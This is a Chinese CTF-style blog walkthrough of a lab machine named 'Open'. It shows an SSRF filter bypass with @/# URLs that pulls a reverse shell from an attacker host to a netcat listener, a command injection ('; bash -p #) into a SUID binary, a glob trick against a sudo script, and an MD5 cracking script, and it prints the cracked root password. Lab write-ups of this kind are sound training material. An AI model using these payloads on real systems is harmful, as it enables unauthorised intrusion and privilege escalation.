+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805004857082.png" alt="image-20250805004857082" data-caption="image-20250805004857082" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805005405502.png" alt="image-20250805005405502" data-caption="image-20250805005405502" loading="lazy"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://open.dsz/info.txt //也可以直接用URL指令来看</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805005648637.png" alt="image-20250805005648637" data-caption="image-20250805005648637" loading="lazy"></p>
+<p>查看 info.txt 的内容发现它包含 PHP 代码，这暗示服务器可能存在文件包含或解析漏洞。</p>
+<h1 id="二、初始访问"><a href="#二、初始访问" class="headerlink" title="二、初始访问"></a><strong>二、初始访问</strong></h1><h2 id="Web-渗透-SSRF"><a href="#Web-渗透-SSRF" class="headerlink" title="Web 渗透 (SSRF)"></a><strong>Web</strong> <strong>渗透</strong> <strong>(SSRF)</strong></h2><p>网站主页提供了一个功能，允许通过 URL 参数 ?url&#x3D; 来加载指定的页面。</p>
+<p>经过测试，发现后端对 URL 进行了限制，只允许加载以 <a target="_blank" rel="noopener" href="http://open/">http://open</a> 开头的地址，并且会解析</p>
+<p>info.txt ，正常的思路是这个过滤机制可以通过在 URL 中使用 @ 符号来绕过，这是一种典</p>
+<p>型的服务器端请求伪造 (SSRF) 漏洞。我们可以利用此漏洞，使服务器请求并执行我们托管的恶意文件。</p>
+<p><strong>攻击步骤</strong>：</p>
+<ol>
+<li><p>在攻击机（kali）上开启apache2的 HTTP 服务器。</p>
+</li>
+<li><p>在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码</p>
+</li>
+<li><p>在 Kali 上开启 netcat 监听。</p>
+</li>
+<li><p>在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。</p>
+</li>
+<li><p>最后在攻击机（kali）上面开启的监听就会有回显。</p>
+</li>
+</ol>
+<h2 id="1-在攻击机（kali）上开启apache2的-HTTP-服务器。"><a href="#1-在攻击机（kali）上开启apache2的-HTTP-服务器。" class="headerlink" title="1.在攻击机（kali）上开启apache2的 HTTP 服务器。"></a>1.在攻击机（kali）上开启apache2的 HTTP 服务器。</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805181548184.png" alt="image-20250805181548184" data-caption="image-20250805181548184" loading="lazy"></p>
+<h2 id="2-在攻击机-Kali-上创建一个反弹-shell-的-txt-文件-reverse-txt-里面写的是php代码，要存放在-var-www-html-目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功-kali有自带的反弹shell的文件"><a href="#2-在攻击机-Kali-上创建一个反弹-shell-的-txt-文件-reverse-txt-里面写的是php代码，要存放在-var-www-html-目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功-kali有自带的反弹shell的文件" class="headerlink" title="2.在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码，要存放在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功(kali有自带的反弹shell的文件)"></a>2.在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码，要存放在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功(kali有自带的反弹shell的文件)</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805183257010.png" alt="image-20250805183257010" data-caption="image-20250805183257010" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805181306712.png" alt="image-20250805181306712" data-caption="image-20250805181306712" loading="lazy"></p>
+<h2 id="3-在-Kali-上开启-netcat-监听"><a href="#3-在-Kali-上开启-netcat-监听" class="headerlink" title="3.在 Kali 上开启 netcat 监听"></a>3.在 Kali 上开启 netcat 监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805182010492.png" alt="image-20250805182010492" data-caption="image-20250805182010492" loading="lazy"></p>
+<h2 id="4-在靶机上构造恶意的-URL，利用-符号绕过主机验证，并指向攻击机-kali-上的反弹-shell-文件。"><a href="#4-在靶机上构造恶意的-URL，利用-符号绕过主机验证，并指向攻击机-kali-上的反弹-shell-文件。" class="headerlink" title="4.在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。"></a>4.在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805182051783.png" alt="image-20250805182051783" data-caption="image-20250805182051783" loading="lazy"></p>
+<p>拓展知识：</p>
+<p>上面要求我们输入一个以<a target="_blank" rel="noopener" href="http://open开头的/">http://open开头的</a> url，但是网页前面已经有<a target="_blank" rel="noopener" href="http://open.dsz,这就构成了双url,所以此时要截断前面的open访问后面我们想要访问的地址,即可能存在/">http://open.dsz，这就构成了双URL，所以此时要截断前面的open访问后面我们想要访问的地址，即可能存在</a> SSRF 漏洞的迹象，让我们澄清我们的怀疑。</p>
+<p>我也尝试了所有带有<strong>白名单过滤器绕过</strong>的方法，我也得到了回复 🔻<code>SSRF payload</code></p>
+<p>绕过过滤器</p>
+<p>为了正确进行 SSRF 攻击，可能存在需要绕过过滤器的用例</p>
+<p>模式验证</p>
+<p>在这种情况下，可以使用基于白名单的输入过滤器来限制用户可以提交的 URL 类型。例如，过滤器可能只允许与白名单模式匹配的网址。在这种情况下，您可以使用各种技术绕过过滤器：</p>
+<ul>
+<li>在 URL 中使用字符，如下所示：<code>@</code></li>
+<li><code>https://&#123;url&#125;@&#123;target_host&#125;</code></li>
+<li>使用字符指示第一个字段被解释为 URL 片段，如下所示：<code>#</code></li>
+<li><code>https://&#123;target_host&#125;#&#123;url&#125;</code></li>
+<li>使用 DNS 名称将所需的输入放入完全限定的 DNS 中，如下所示：</li>
+<li><code>https://&#123;url&#125;.&#123;target_host&#125;</code></li>
+<li>URL 编码，甚至双 URL 编码此特殊字符以绕过过滤器</li>
+<li>使用所有这些技术的组合，例如使用字符。<code>#@</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://boxing.hmv#127.0.0.1 or http://boxing.hmv@127.0.0.1 </span><br></pre></td></tr></table></figure>
+
+<h2 id="5-最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。"><a href="#5-最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。" class="headerlink" title="5.最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。"></a>5.最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805182247855.png" alt="image-20250805182247855" data-caption="image-20250805182247855" loading="lazy"></p>
+<h2 id="6-上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的"><a href="#6-上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的" class="headerlink" title="6.上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的"></a>6.上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/script -qc /bin/bash /dev/null   //启动一个干净的 bash 会话，且不记录任何操作日志（隐蔽性较强）。</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805184724454.png" alt="image-20250805184724454" data-caption="image-20250805184724454" loading="lazy"></p>
+<p>7.获取初始 shell 后，在 &#x2F;home 目录下发现了 giao , miao , xiao 三个用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .   //直接查找 ‘.’表示当前目录及其所有子目录。快捷省时</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805190546069.png" alt="image-20250805190546069" data-caption="image-20250805190546069" loading="lazy"></p>
+<h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a><strong>三、权限提升</strong></h1><h2 id="1-从-www-data-到-miao"><a href="#1-从-www-data-到-miao" class="headerlink" title="1. 从 www**-**data 到 miao"></a><strong>1.</strong> <strong>从</strong> www**-**data <strong>到</strong> miao</h2><p>在 &#x2F;opt 目录中，发现了一个具有 SUID 权限的可执行文件 echo 。<code>/opt</code> 目录是一个<strong>可选（Optional）软件安装目录</strong>，通常用于存放第三方或独立开发的应用程序（非系统自带软件包）</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805194607759.png" alt="image-20250805194607759" data-caption="image-20250805194607759" loading="lazy"></p>
+<p>通过逆向分析 echo 文件，发现它存在命令注入漏洞。</p>
+<h2 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> v4[<span class="number">2</span>]; <span class="comment">// [rsp+1Eh] [rbp-232h] BYREF</span></span><br><span class="line"></span><br><span class="line">_QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-230h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [rsp+30h] [rbp-220h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+34h] [rbp-21Ch] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> dest[<span class="number">524</span>]; <span class="comment">// [rsp+40h] [rbp-210h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// [rsp+24Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( setgid(<span class="number">0x3E8u</span>) || setuid(<span class="number">0x3E8u</span>) )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">fwrite(<span class="string">&quot;鏉冮檺璁剧疆澶辫触\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x13u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">v5[<span class="number">0</span>] = <span class="number">0xE75B27206F686365L</span>L;</span><br><span class="line"></span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">0x93BEE8B788E6A894L</span>L;</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">1571128805</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(v7, <span class="string">&quot;: &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(v4, <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(dest, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(dest, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(dest, v4);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(asc_2047, dest);</span><br><span class="line"></span><br><span class="line">v9 = system(dest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">perror(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;浣跨敤鏂规硶: %s \&quot;瑕佸洖鏄剧殑娑堟伅\&quot;\n&quot;</span>, *argv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该程序会将其获取的命令行参数直接拼接到一个系统命令字符串中并执行，并且会以用户 miao (UID\1000) 的权限运行。</p>
+<p>利用此漏洞，通过注入 bash -p 命令，我们成功获得了一个拥有 miao 用户权限的 shell。</p>
+<p>“‘; id; whoami #”  中的单引号‘是跟前面的单引号’闭合，紧接着逗号；结束，再输入我们要查找的指令即可，后面的井号#是注释掉后面的内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@Open:/opt$ ./echo <span class="string">&quot;&#x27;; id; whoami #&quot;</span></span><br><span class="line"></span><br><span class="line">执行命令: <span class="built_in">echo</span> <span class="string">&#x27;[用户输入]: &#x27;</span>; <span class="built_in">id</span>; <span class="built_in">whoami</span> <span class="comment">#&#x27;</span></span><br><span class="line"></span><br><span class="line">[用户输入]:</span><br><span class="line"></span><br><span class="line">uid=1000(miao) gid=1000(miao) <span class="built_in">groups</span>=1000(miao),33(www-data)</span><br><span class="line"></span><br><span class="line">miao</span><br><span class="line"></span><br><span class="line">www-data@Open:/opt$ ./echo <span class="string">&quot;&#x27;; bash -p #&quot;</span></span><br><span class="line"></span><br><span class="line">执行命令: <span class="built_in">echo</span> <span class="string">&#x27;[用户输入]: &#x27;</span>; bash -p <span class="comment">#&#x27;</span></span><br><span class="line"></span><br><span class="line">[用户输入]:</span><br><span class="line"></span><br><span class="line">miao@Open:/opt$ <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line">uid=1000(miao) gid=1000(miao) <span class="built_in">groups</span>=1000(miao),33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805195221842.png" alt="image-20250805195221842" data-caption="image-20250805195221842" loading="lazy"></p>
+<h2 id="2-从-miao-到-root"><a href="#2-从-miao-到-root" class="headerlink" title="2. 从 miao 到 root"></a><strong>2.</strong> <strong>从</strong> miao <strong>到</strong> root</h2><p>成为 miao 用户后，执行 sudo -l 发现该用户可以无密码执行 &#x2F;opt&#x2F;hello.sh 脚本。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805200529964.png" alt="image-20250805200529964" data-caption="image-20250805200529964" loading="lazy"></p>
+<p>查看该脚本内容，发现它对输入参数 “dsz” 做了判断。如果参数完全等于 “dsz”，脚本会直接退出。然</p>
+<p>而，脚本使用了 [ $1 &#x3D; “dsz” ] 这种不严谨的判断方式。法一直接用空格绕过</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805200854000.png" alt="image-20250805200854000" data-caption="image-20250805200854000" loading="lazy"></p>
+<p>法二：我们也可以通过 bash 的通配符扩展（globbing）来绕过这个检查。</p>
+<ol>
+<li><p>在 &#x2F;tmp 目录下创建一个名为 “dsz “ （注意末尾有空格）的文件。</p>
+</li>
+<li><p>执行 sudo &#x2F;opt&#x2F;hello.sh * ，此时 * 会被 shell 扩展为文件名 “dsz “ ，从而绕过了 [ “$1”</p>
+</li>
+</ol>
+<p>&#x3D; “dsz” ] 的检查，并成功执行了 cat &#x2F;root&#x2F;password.txt 命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">miao@Open:/tmp$ <span class="built_in">touch</span> <span class="string">&#x27;dsz &#x27;</span></span><br><span class="line"></span><br><span class="line">miao@Open:/tmp$ <span class="built_in">sudo</span> /opt/hello.sh *</span><br><span class="line"></span><br><span class="line">6cd1f22e65d26246530ff7a2528144e3</span><br><span class="line"></span><br><span class="line">Goodbye!</span><br></pre></td></tr></table></figure>
+
+<p>我们得到了一个 MD5 哈希。值得注意的是，脚本中获取哈希的方式是 cat &#x2F;root&#x2F;password.txt | md5sum ，这意味着被哈希的原始密码字符串末尾会包含一个换行符 ( \n )。使用自定义的 Python 脚本，针对包含换行符的密码进行爆破，最终成功破解出 root 用户的密码为 do167watt041 。(在kali执行py,代码缩进有问题执行不了)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span></span><br><span class="line">h = <span class="string">&#x27;6cd1f22e65d26246530ff7a2528144e3&#x27;</span></span><br><span class="line">fnd = <span class="literal">False</span></span><br><span class="line">thd = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5chk</span>(<span class="params">w</span>):</span><br><span class="line">	<span class="keyword">global</span> fnd</span><br><span class="line">	<span class="keyword">if</span> fnd:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	m = hashlib.md5(w).hexdigest()</span><br><span class="line">	<span class="keyword">if</span> m == h:</span><br><span class="line">		<span class="keyword">with</span> threading.Lock():</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> fnd:</span><br><span class="line">				fnd = <span class="literal">True</span></span><br><span class="line">				<span class="built_in">print</span>(<span class="string">f&#x27;\n[+] 命中: <span class="subst">&#123;w.decode().strip()&#125;</span>&#x27;</span>)</span><br><span class="line">		exit()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">	lines = fd.readlines()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;爆破中...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">line</span>):</span><br><span class="line">	<span class="keyword">global</span> fnd</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> fnd:</span><br><span class="line">		md5chk(line)</span><br><span class="line">        </span><br><span class="line">ts = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	<span class="keyword">if</span> fnd:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">	<span class="keyword">while</span> threading.active_count() &gt; thd:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    t = threading.Thread(target=worker, args=(line,))</span><br><span class="line">    t.start()</span><br><span class="line">    ts.append(t)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> ts:</span><br><span class="line">	t.join()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> fnd:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\n[-] 未找到匹配项&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用该密码成功切换到 root 用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">miao@Open:/tmp$ su -</span><br><span class="line">Password: do167watt041</span><br><span class="line">root@Open:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805202805297.png" alt="image-20250805202805297" data-caption="image-20250805202805297" loading="lazy"></p>
+<h2 id="拓展知识：恢复终端"><a href="#拓展知识：恢复终端" class="headerlink" title="拓展知识：恢复终端"></a>拓展知识：恢复终端</h2><ol>
+<li>如果按 <code>Ctrl+Z</code> 暂停了一个进程（比如 <code>vim</code> 或 <code>ncat</code>，<code>ssh</code>），不想再重新输入命令重新开启<code>vim</code> 或 <code>ncat</code>,<code>ssh</code>等等。</li>
+<li>执行 <code>stty raw -echo; fg</code> 后：<ul>
+<li><code>stty raw -echo</code> 确保终端恢复正常输入输出。</li>
+<li><code>fg</code> 恢复 <code>ssh</code> 会话。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805202959231.png" alt="image-20250805202959231" data-caption="image-20250805202959231" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/SSRF/" rel="tag">SSRF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/url%E6%88%AA%E6%96%AD/" rel="tag">url截断</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925210"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E4%B8%80%E5%BC%80%E5%A7%8B%E8%AE%BF%E9%97%AE%E4%B8%8D%E5%87%BA%E6%9D%A5%EF%BC%8C%E6%83%B3%E5%88%B0%E8%A6%81%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">页面一开始访问不出来，想到要域名解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E5%B0%B1%E6%9C%89%E7%82%B9%E7%8E%84%E5%AD%A6%E4%BA%86%EF%BC%8C%E5%9F%9F%E5%90%8D%E5%8F%AF%E4%BB%A5%E6%89%AB%E5%87%BA%E6%96%87%E4%BB%B6%E8%80%8CIP%E5%8D%B4%E6%89%AB%E4%B8%8D%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">这就有点玄学了，域名可以扫出文件而IP却扫不出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E6%89%AB%E7%9B%AE%E5%BD%95%E7%9A%84%E6%96%B9%E5%BC%8F%E2%80%94gobuster-%E6%8E%A8%E8%8D%90"><span class="toc-number">1.3.</span> <span class="toc-text">另外一种扫目录的方式—gobuster(推荐)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">2.</span> <span class="toc-text">二、初始访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F-SSRF"><span class="toc-number">2.1.</span> <span class="toc-text">Web 渗透 (SSRF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%88kali%EF%BC%89%E4%B8%8A%E5%BC%80%E5%90%AFapache2%E7%9A%84-HTTP-%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82"><span class="toc-number">2.2.</span> <span class="toc-text">1.在攻击机（kali）上开启apache2的 HTTP 服务器。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 